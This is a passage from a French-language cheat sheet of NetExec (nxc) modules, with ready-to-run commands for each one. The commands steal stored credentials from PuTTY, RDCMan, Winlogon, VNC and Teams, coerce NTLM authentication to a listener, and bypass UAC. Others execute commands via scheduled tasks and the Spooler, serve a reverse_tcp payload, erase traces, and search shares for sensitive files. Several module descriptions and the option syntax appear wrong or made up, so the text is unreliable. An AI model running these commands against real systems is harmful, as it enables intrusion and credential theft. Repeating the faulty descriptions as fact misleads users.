* Compile les configurations PSO de toutes les cibles dans un fichier unique.

***

### Module : `putty`

**1. Nom du Module : `putty`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche et extrait les clés et configurations enregistrées de l'application PuTTY sur une cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les clés et configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M putty
```

**Explication** :

* Recherche les clés et configurations PuTTY sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M putty -o OUTPUT=putty_configs.txt
```

**Explication** :

* Sauvegarde les clés et configurations extraites dans `putty_configs.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M putty -o OUTPUT=all_putty_configs.txt
```

**Explication** :

* Compile les configurations PuTTY de toutes les cibles dans un fichier unique.

***

### Module : `rdcman`

**1. Nom du Module : `rdcman`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module extrait les configurations enregistrées de Remote Desktop Connection Manager (RDCMan) sur une cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M rdcman
```

**Explication** :

* Extrait les configurations RDCMan sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M rdcman -o OUTPUT=rdcman_configs.txt
```

**Explication** :

* Sauvegarde les configurations extraites dans `rdcman_configs.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M rdcman -o OUTPUT=all_rdcman_configs.txt
```

**Explication** :

* Compile les configurations RDCMan pour toutes les cibles dans un fichier unique.

***

### Module : `rdp`

**1. Nom du Module : `rdp`**

* **Protocole pris en charge** : RDP
* **Description** : Ce module vérifie et tente d'exploiter les connexions Remote Desktop Protocol (RDP) sur une cible pour accéder à distance à un hôte.

**2. Options / Paramètres**

* `--USER` : Nom d'utilisateur pour l'authentification.
* `--PASSWORD` : Mot de passe pour l'utilisateur spécifié.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc rdp 192.168.1.10 -u admin -p 'password' -M rdp
```

**Explication** :

* Vérifie l'accès RDP avec les informations d'identification fournies.

**Commande avec fichier de sortie** :

```
nxc rdp 192.168.1.10 -u admin -p 'password' -M rdp -o OUTPUT=rdp_results.txt
```

**Explication** :

* Sauvegarde les résultats de la vérification dans `rdp_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc rdp targets.txt -u admin -p 'password' -M rdp -o OUTPUT=all_rdp_results.txt
```

**Explication** :

* Tente de vérifier l'accès RDP pour toutes les cibles spécifiées et compile les résultats dans un fichier unique.

***

### Module : `reg-query`

**1. Nom du Module : `reg-query`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge des clés spécifiques dans le registre Windows pour extraire des informations critiques.

**2. Options / Paramètres**

* `--KEY` : Clé de registre cible à interroger.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M reg-query -o KEY="HKLM\\Software\\Microsoft"
```

**Explication** :

* Interroge la clé de registre spécifiée sur la cible pour extraire ses valeurs.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M reg-query -o KEY="HKLM\\System",OUTPUT=reg_results.txt
```

**Explication** :

* Sauvegarde les résultats de l'interrogation dans `reg_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M reg-query -o KEY="HKLM\\System",OUTPUT=all_reg_results.txt
```

**Explication** :

* Compile les valeurs de la clé spécifiée pour plusieurs cibles dans un fichier unique.

***

### Module : `reg-winlogon`

**1. Nom du Module : `reg-winlogon`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge la clé Winlogon du registre pour détecter des configurations ou valeurs critiques comme les mots de passe stockés.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M reg-winlogon
```

**Explication** :

* Vérifie les valeurs critiques dans la clé Winlogon sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M reg-winlogon -o OUTPUT=winlogon_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `winlogon_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M reg-winlogon -o OUTPUT=all_winlogon_results.txt
```

**Explication** :

* Compile les configurations Winlogon pour toutes les cibles dans un fichier unique.

***

### Module : `remove-mic`

**1. Nom du Module : `remove-mic`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module supprime des indicateurs spécifiques sur un hôte cible pour effacer des traces ou désactiver des configurations.

**2. Options / Paramètres**

* `--TARGET` : Indicateur ou fichier cible à supprimer.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M remove-mic -o TARGET="/path/to/file"
```

**Explication** :

* Supprime le fichier ou l’indicateur spécifié sur la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M remove-mic -o TARGET="/path/to/file",OUTPUT=removal_results.txt
```

**Explication** :

* Sauvegarde les résultats de la suppression dans `removal_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M remove-mic -o TARGET="/path/to/file",OUTPUT=all_removal_results.txt
```

**Explication** :

* Supprime l’indicateur ou le fichier pour plusieurs cibles et compile les résultats.

***

### Module : `runasppl`

**1. Nom du Module : `runasppl`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module configure une application pour qu'elle s'exécute en tant que Protected Process Light (PPL), améliorant ainsi sa sécurité contre les attaques.

**2. Options / Paramètres**

* `--APPLICATION` : Nom ou chemin de l'application à configurer.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M runasppl -o APPLICATION="C:\\Program Files\\MyApp\\app.exe"
```

**Explication** :

* Configure l'application spécifiée pour qu'elle s'exécute en tant que PPL.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M runasppl -o APPLICATION="C:\\Program Files\\MyApp\\app.exe",OUTPUT=ppl_config_results.txt
```

**Explication** :

* Sauvegarde les résultats de la configuration dans `ppl_config_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M runasppl -o APPLICATION="C:\\Program Files\\MyApp\\app.exe",OUTPUT=all_ppl_results.txt
```

**Explication** :

* Configure l'application sur plusieurs cibles et compile les résultats.

***

### Module : `sccm`

**1. Nom du Module : `sccm`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge les serveurs Microsoft System Center Configuration Manager (SCCM) pour extraire des informations sensibles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats extraits.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M sccm
```

**Explication** :

* Interroge le serveur SCCM sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M sccm -o OUTPUT=sccm_results.txt
```

**Explication** :

* Sauvegarde les informations extraites dans `sccm_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M sccm -o OUTPUT=all_sccm_results.txt
```

**Explication** :

* Compile les informations SCCM pour toutes les cibles définies dans un fichier unique.

***

### Module : `schtask_as`

**1. Nom du Module : `schtask_as`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module utilise les tâches planifiées pour exécuter des commandes ou des charges utiles avec des privilèges élevés.

**2. Options / Paramètres**

* `--TASKNAME` : Nom de la tâche planifiée.
* `--COMMAND` : Commande ou charge utile à exécuter.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M schtask_as -o TASKNAME="ElevatedTask",COMMAND="whoami"
```

**Explication** :

* Crée une tâche planifiée `ElevatedTask` pour exécuter la commande `whoami` avec des privilèges élevés.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M schtask_as -o TASKNAME="ElevatedTask",COMMAND="dir",OUTPUT=schtask_results.txt
```

**Explication** :

* Sauvegarde les résultats de l'exécution de la tâche planifiée dans `schtask_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M schtask_as -o TASKNAME="ElevatedTask",COMMAND="ipconfig",OUTPUT=all_schtask_results.txt
```

**Explication** :

* Crée et exécute une tâche planifiée sur plusieurs cibles et compile les résultats.

***

### Module : `scuffy`

**1. Nom du Module : `scuffy`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module vérifie et exploite les partages de fichiers mal configurés pour extraire des informations sensibles ou accéder à des fichiers critiques.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M scuffy
```

**Explication** :

* Analyse les partages de fichiers mal configurés sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M scuffy -o OUTPUT=scuffy_results.txt
```

**Explication** :

* Sauvegarde les résultats de l'analyse dans `scuffy_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M scuffy -o OUTPUT=all_scuffy_results.txt
```

**Explication** :

* Compile les résultats des partages de fichiers pour plusieurs cibles dans un fichier unique.

***

### Module : `security-questions`

**1. Nom du Module : `security-questions`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module analyse Active Directory pour identifier les utilisateurs avec des questions de sécurité définies, qui peuvent être exploitées pour contourner l'authentification.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M security-questions
```

**Explication** :

* Recherchez les utilisateurs avec des questions de sécurité configurées.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M security-questions -o OUTPUT=security_questions_users.txt
```

**Explication** :

* Sauvegarde la liste des utilisateurs identifiés dans `security_questions_users.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M security-questions -o OUTPUT=all_security_questions_users.txt
```

**Explication** :

* Compile les résultats pour toutes les cibles dans un fichier unique.

***

### Module : `shadowcoerce`

**1. Nom du Module : `shadowcoerce`**

* **Protocole pris en charge** : RPC
* **Description** : Ce module exploite les vulnérabilités des appels RPC pour forcer l'authentification NTLM sur un hôte écouteur.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les authentifications forcées.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc rpc 192.168.1.10 -M shadowcoerce -o LISTEN=192.168.1.20
```

**Explication** :

* Force la cible à s’authentifier sur l’hôte écouteur spécifié.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc rpc targets.txt -M shadowcoerce -o LISTEN=192.168.1.20
```

**Explication** :

* Applique l’exploitation sur plusieurs cibles et capture les authentifications.

***

### Module : `shadowrdp`

**1. Nom du Module : `shadowrdp`**

* **Protocole pris en charge** : RDP
* **Description** : Ce module configure des sessions RDP de l’ombre pour surveiller ou interagir avec les sessions actives d’un utilisateur sur un hôte cible.

**2. Options / Paramètres**

* `--SESSION` : ID de la session à surveiller ou avec laquelle interagir.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc rdp 192.168.1.10 -M shadowrdp -o SESSION=1
```

**Explication** :

* Configure une session RDP de l’ombre pour surveiller la session `1` sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc rdp 192.168.1.10 -M shadowrdp -o SESSION=1,OUTPUT=shadowrdp_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `shadowrdp_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc rdp targets.txt -M shadowrdp -o SESSION=all,OUTPUT=all_shadowrdp_results.txt
```

**Explication** :

* Configure et compile les résultats pour toutes les sessions sur plusieurs cibles.

***

### Module : `slinky`

**1. Nom du Module : `slinky`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module détecte les partages SMB mal configurés ou vulnérables à l’accès non autorisé.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M slinky
```

**Explication** :

* Analyse les partages SMB sur la cible pour identifier des vulnérabilités potentielles.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M slinky -o OUTPUT=slinky_results.txt
```

**Explication** :

* Sauvegarde les résultats de l’analyse dans `slinky_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M slinky -o OUTPUT=all_slinky_results.txt
```

**Explication** :

* Compile les résultats des partages SMB pour toutes les cibles dans un fichier unique.

***

### Module : `smbghost`

**1. Nom du Module : `smbghost`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module détecte la vulnérabilité "SMBGhost" (CVE-2020-0796) sur des systèmes Windows.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M smbghost
```

**Explication** :

* Vérifie si la cible est vulnérable à SMBGhost.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M smbghost -o OUTPUT=smbghost_results.txt
```

**Explication** :

* Sauvegarde les résultats de l’analyse dans `smbghost_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M smbghost -o OUTPUT=all_smbghost_results.txt
```

**Explication** :

* Vérifie la vulnérabilité SMBGhost pour plusieurs cibles et compile les résultats.

***

### Module : `snipped`

**1. Nom du Module : `snipped`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche des fichiers spécifiques sur les partages SMB en fonction de critères de recherche prédéfinis.

**2. Options / Paramètres**

* `--PATTERN` : Motif de recherche (regex ou nom de fichier).
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M snipped -o PATTERN="*.docx"
```

**Explication** :

* Recherche tous les fichiers `.docx` sur les partages SMB de la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M snipped -o PATTERN="*.docx",OUTPUT=snipped_results.txt
```

**Explication** :

* Sauvegarde les résultats de la recherche dans `snipped_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M snipped -o PATTERN="confidential*",OUTPUT=all_snipped_results.txt
```

**Explication** :

* Recherche des fichiers correspondant au motif "confidential\*" sur plusieurs cibles et compile les résultats.

***

### Module : `spider_plus`

**1. Nom du Module : `spider_plus`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module effectue une recherche avancée sur les partages SMB pour localiser des fichiers sensibles.

**2. Options / Paramètres**

* `--PATTERN` : Motif de recherche pour cibler des fichiers spécifiques.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M spider_plus -o PATTERN="*.xls"
```

**Explication** :

* Recherche des fichiers `.xls` sur les partages SMB de la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M spider_plus -o PATTERN="*.xls",OUTPUT=spider_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `spider_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M spider_plus -o PATTERN="finance*",OUTPUT=all_spider_results.txt
```

**Explication** :

* Recherche les fichiers correspondant au motif "finance\*" sur plusieurs cibles et compile les résultats.

***

### Module : `spooler`

**1. Nom du Module : `spooler`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite les vulnérabilités du service d’impression Windows Spooler pour exécuter des commandes arbitraires.

**2. Options / Paramètres**

* `--COMMAND` : Commande à exécuter.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M spooler -o COMMAND="ipconfig"
```

**Explication** :

* Exécute la commande `ipconfig` via le service Spooler de la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M spooler -o COMMAND="dir",OUTPUT=spooler_results.txt
```

**Explication** :

* Sauvegarde les résultats de la commande dans `spooler_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M spooler -o COMMAND="netstat",OUTPUT=all_spooler_results.txt
```

**Explication** :

* Exécute une commande sur plusieurs cibles et compile les résultats.

***

### Module : `subnets`

**1. Nom du Module : `subnets`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module interroge Active Directory pour identifier les sous-réseaux configurés dans le site et les services.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M subnets
```

**Explication** :

* Liste les sous-réseaux configurés dans Active Directory pour le domaine spécifié.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M subnets -o OUTPUT=subnets.txt
```

**Explication** :

* Sauvegarde les résultats dans le fichier `subnets.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M subnets -o OUTPUT=all_subnets.txt
```

**Explication** :

* Compile les sous-réseaux configurés pour toutes les cibles définies.

***

### Module : `teams_localdb`

**1. Nom du Module : `teams_localdb`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module extrait les bases de données locales de Microsoft Teams contenant des informations sur les utilisateurs et les messages.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les bases de données extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M teams_localdb
```

**Explication** :

* Extrait les bases de données locales de Microsoft Teams sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M teams_localdb -o OUTPUT=teams_db.zip
```

**Explication** :

* Sauvegarde les bases de données extraites dans `teams_db.zip`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M teams_localdb -o OUTPUT=all_teams_dbs.zip
```

**Explication** :

* Extrait les bases de données pour toutes les cibles définies et les regroupe dans un fichier compressé.

***

### Module : `test_connection`

**1. Nom du Module : `test_connection`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module effectue des tests de connectivité de base pour vérifier si un hôte est accessible et accepte les connexions.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats des tests.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M test_connection
```

**Explication** :

* Vérifie la connectivité de base avec la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M test_connection -o OUTPUT=connection_test.txt
```

**Explication** :

* Sauvegarde les résultats du test dans `connection_test.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M test_connection -o OUTPUT=all_connection_tests.txt
```

**Explication** :

* Teste la connectivité pour plusieurs cibles et compile les résultats.

***

### Module : `timeroast`

**1. Nom du Module : `timeroast`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module interroge les objets Active Directory pour identifier les tickets Kerberos vulnérables pouvant être exploités via l’attaque "timeroast".

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats des objets identifiés.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M timeroast
```

**Explication** :

* Recherche les tickets Kerberos vulnérables dans Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M timeroast -o OUTPUT=timeroast_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `timeroast_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M timeroast -o OUTPUT=all_timeroast_results.txt
```

**Explication** :

* Compile les tickets vulnérables identifiés pour toutes les cibles dans un fichier unique.

***

### Module : `uac`

**1. Nom du Module : `uac`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module vérifie et tente de contourner les contrôles UAC (User Account Control) sur des cibles Windows.

**2. Options / Paramètres**

* `--BYPASS` : Active ou désactive la tentative de contournement.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M uac
```

**Explication** :

* Vérifie si UAC est activé sur la cible.

**Commande avec tentative de contournement** :

```
nxc smb 192.168.1.10 -M uac -o BYPASS=true
```

**Explication** :

* Tente de contourner UAC si activé.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M uac -o OUTPUT=uac_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `uac_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M uac -o BYPASS=true,OUTPUT=all_uac_results.txt
```

**Explication** :

* Vérifie et tente de contourner UAC pour plusieurs cibles et compile les résultats.

***

### Module : `user-desc`

**1. Nom du Module : `user-desc`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module interroge les descriptions des comptes d’utilisateurs dans Active Directory pour extraire des informations potentielles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les descriptions.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M user-desc
```

**Explication** :

* Récupère les descriptions des comptes d’utilisateurs dans le domaine Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M user-desc -o OUTPUT=user_descriptions.txt
```

**Explication** :

* Sauvegarde les descriptions dans `user_descriptions.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M user-desc -o OUTPUT=all_user_descriptions.txt
```

**Explication** :

* Compile les descriptions des comptes pour toutes les cibles dans un fichier unique.

***

### Module : `veeam`

**1. Nom du Module : `veeam`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge les installations de Veeam Backup pour extraire des informations de configuration ou des données sensibles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les données extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M veeam
```

**Explication** :

* Interroge les configurations Veeam Backup sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M veeam -o OUTPUT=veeam_config.txt
```

**Explication** :

* Sauvegarde les données extraites dans `veeam_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M veeam -o OUTPUT=all_veeam_configs.txt
```

**Explication** :

* Compile les informations Veeam Backup pour plusieurs cibles dans un fichier unique.

***

### Module : `vnc`

**1. Nom du Module : `vnc`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge les installations VNC sur une cible pour détecter les configurations ou mots de passe enregistrés.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les informations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M vnc
```

**Explication** :

* Vérifie les configurations VNC sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M vnc -o OUTPUT=vnc_config.txt
```

**Explication** :

* Sauvegarde les configurations extraites dans `vnc_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M vnc -o OUTPUT=all_vnc_configs.txt
```

**Explication** :

* Compile les configurations VNC pour plusieurs cibles dans un fichier unique.

***

### Module : `wam`

**1. Nom du Module : `wam`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge les services Web Account Manager (WAM) pour extraire des informations d’authentification potentiellement sensibles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les données extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M wam
```

**Explication** :

* Interroge les services WAM sur la cible spécifiée pour extraire des informations d’authentification.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M wam -o OUTPUT=wam_data.txt
```

**Explication** :

* Sauvegarde les informations extraites dans `wam_data.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M wam -o OUTPUT=all_wam_data.txt
```

**Explication** :

* Compile les informations WAM pour plusieurs cibles dans un fichier unique.

***

### Module : `wcc`

**1. Nom du Module : `wcc`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module vérifie les informations de configuration des postes de travail, notamment les détails sur les utilisateurs connectés et les sessions.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les données extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M wcc
```

**Explication** :

* Extrait les informations sur les utilisateurs connectés et les sessions sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M wcc -o OUTPUT=wcc_data.txt
```

**Explication** :

* Sauvegarde les informations extraites dans `wcc_data.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M wcc -o OUTPUT=all_wcc_data.txt
```

**Explication** :

* Compile les informations des utilisateurs connectés pour plusieurs cibles dans un fichier unique.

***

### Module : `wdigest`

**1. Nom du Module : `wdigest`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge les configurations de sécurité WDigest sur une cible pour identifier des vulnérabilités liées à l'authentification.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les données extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M wdigest
```

**Explication** :

* Vérifie les configurations WDigest sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M wdigest -o OUTPUT=wdigest_data.txt
```

**Explication** :

* Sauvegarde les résultats de la vérification dans `wdigest_data.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M wdigest -o OUTPUT=all_wdigest_data.txt
```

**Explication** :

* Compile les configurations WDigest pour plusieurs cibles dans un fichier unique.

***

### Module : `web_delivery`

**1. Nom du Module : `web_delivery`**

* **Protocole pris en charge** : HTTP/HTTPS
* **Description** : Ce module configure et exécute un serveur de livraison de charge utile via des requêtes HTTP ou HTTPS.

**2. Options / Paramètres**

* `--PAYLOAD` : Charge utile à livrer.
* `--PORT` : Port sur lequel le serveur écoute.
* `--OUTPUT` : Fichier de sortie pour enregistrer les logs d'accès.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc http 192.168.1.10 -M web_delivery -o PAYLOAD=reverse_tcp,PORT=8080
```

**Explication** :

* Configure un serveur HTTP pour livrer une charge utile `reverse_tcp` sur le port 8080.

**Commande avec fichier de sortie** :

```
nxc http 192.168.1.10 -M web_delivery -o PAYLOAD=reverse_tcp,PORT=8080,OUTPUT=web_logs.txt
```

**Explication** :

* Sauvegarde les logs d'accès dans `web_logs.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc http targets.txt -M web_delivery -o PAYLOAD=reverse_tcp,PORT=8080,OUTPUT=all_web_logs.txt
```

**Explication** :

* Configure un serveur pour plusieurs cibles et compile les logs d'accès.

***

### Module : `webdav`

**1. Nom du Module : `webdav`**

* **Protocole pris en charge** : HTTP/HTTPS
* **Description** : Ce module exploite des vulnérabilités sur les serveurs WebDAV pour télécharger, téléverser ou manipuler des fichiers.

**2. Options / Paramètres**

* `--ACTION` : Action à effectuer (`upload`, `download`, ou `delete`).
* `--FILE` : Chemin du fichier cible ou à téléverser.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc http 192.168.1.10 -M webdav -o ACTION=download,FILE=/path/to/remote/file
```

**Explication** :

* Télécharge le fichier spécifié depuis le serveur WebDAV cible.

**Commande avec fichier de sortie** :

```
nxc http 192.168.1.10 -M webdav -o ACTION=upload,FILE=/path/to/local/file,OUTPUT=webdav_results.txt
```

**Explication** :

* Téléverse un fichier local sur le serveur WebDAV et enregistre les résultats dans `webdav_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc http targets.txt -M webdav -o ACTION=delete,FILE=/path/to/remote/file
```

**Explication** :

* Supprime le fichier spécifié sur plusieurs cibles WebDAV.

***

### Module : `whoami`

**1. Nom du Module : `whoami`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exécute la commande `whoami` sur une cible pour vérifier les privilèges actuels.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M whoami
```

**Explication** :

* Exécute la commande `whoami` sur la cible pour identifier l'utilisateur actuel.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M whoami -o OUTPUT=whoami_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `whoami_results.txt`.

